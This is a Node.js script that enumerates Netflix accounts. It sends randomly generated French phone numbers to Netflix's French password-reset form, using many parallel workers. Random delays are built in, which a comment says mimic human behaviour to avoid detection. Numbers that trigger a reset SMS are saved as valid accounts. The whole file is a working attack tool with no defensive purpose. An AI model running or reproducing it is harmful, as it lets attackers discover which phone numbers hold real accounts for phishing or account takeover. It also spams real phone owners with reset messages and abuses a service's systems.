const request = require('request');
const fs = require('fs');
const cluster = require('cluster');
const { genFrance } = require('./utils'); // Assumes this function generates French phone numbers
const threads = 10;
const delay = ms => new Promise(resolve => setTimeout(resolve, ms)); // Simple delay function

let cookies = '';

(async () => {
    // Dynamically import chalk using import()
    const chalk = await import('chalk');

    if (cluster.isMaster) {
        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }
    } else {
        (async () => {
            for (let i = 0; i < 100000; i++) {
                const num = genFrance();
                await check(num, chalk);
                await delay(2000 + Math.random() * 2000);  // Random delay between 2 and 4 seconds to mimic human behavior
            }
            process.exit(1);
        })();
    }
})();

function updateCookies(response) {
    const setCookies = response.headers['set-cookie'];
    if (setCookies) {
        cookies += setCookies.map(c => c.split(';')[0]).join('; ') + '; ';
    }
}

async function check(num, chalk) {
    const postData = {
        'phoneNumber': num,  // Netflix's form field for phone number
        'resetPasswordChoice': 'bxid_resetPasswordChoice_text',  // Select the SMS option using the correct ID
        'action': 'submit'   // Submit the form
    };

    const options = {
        url: 'https://www.netflix.com/fr/LoginHelp',  // Netflix login help URL
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Referer': 'https://www.netflix.com/fr/LoginHelp',  // Ensure the referer is set correctly
            'Cookie': cookies  // Send cookies from previous responses
        },
        form: postData,
        followRedirect: true  // Automatically follow redirects
    };

    return new Promise((resolve, reject) => {
        request(options, (error, response, body) => {
            if (error) {
                console.log(`${chalk.default.bold.red('Request error:')} ${error}`);
                resolve('fail');
                return;
            }

            updateCookies(response);  // Update cookies from the response

            // Log response headers to understand the redirection or potential issues
            console.log(`${chalk.default.bold.yellow('Response Headers:')}`, response.headers);
            console.log(`${chalk.default.bold.blue('Response statusCode:')} ${response.statusCode}`);

            if (response.statusCode === 200) {
                if (body.includes("nous avons envoyé un SMS")) {
                    console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.bold.green(num)} ${chalk.default.bold.green('Valid')}`);
                    fs.appendFileSync('Valid.txt', num + '\n');
                } else if (body.includes("Ce numéro de téléphone n'est lié à aucun compte")) {
                    console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.bold.red(num)} ${chalk.default.bold.red('Invalid')}`);
                    fs.appendFileSync('Invalid.txt', num + '\n');
                } else {
                    console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.yellow(num)} ${chalk.default.yellow('Unknown response, possible redirect.')}`);
                }
                resolve('x');
            } else {
                console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.red(num)} ${chalk.default.red('Failed with status code:')} ${chalk.default.red(response.statusCode)}`);
                resolve('fail');
            }
        });
    });
}
